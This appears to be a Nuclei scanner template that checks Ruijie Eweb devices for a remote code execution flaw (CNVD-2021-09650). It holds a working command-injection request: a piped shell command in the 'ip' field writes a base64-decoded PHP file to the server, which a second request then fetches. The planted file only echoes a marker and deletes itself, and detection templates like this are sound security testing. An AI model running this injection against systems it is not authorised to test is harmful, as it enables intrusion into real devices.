id: ruijie-eweb-rce-cnvd-2021-09650
info:
  name: Ruijie Eweb Remote Code Execution Vulnerability (CNVD-2021-09650)
  author: ProjectDiscoveryAI
  severity: high
  tags: rce,CNVD-2021-09650
  description: |
    Ruijie Eweb is vulnerable to a remote code execution vulnerability allowing attackers to execute arbitrary code on the server.

variables:
  r1: "{{rand_int(1000, 10000)}}"
  r2: "{{md5(r1)}}"
  phpcode: "<?php echo '{{r2}}'; unlink(__FILE__); ?>"
  payload: "{{base64(phpcode)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-php-backdoor
    method: POST
    path:
      - "{{BaseURL}}/guest_auth/guestIsUp.php"
    body: "ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r1}}.php&mac=00-00"
    matchers:
      - type: status
        status:
          - 200

  - id: execute-backdoor
    method: GET
    path:
      - "{{BaseURL}}/guest_auth/{{r1}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{r2}}"
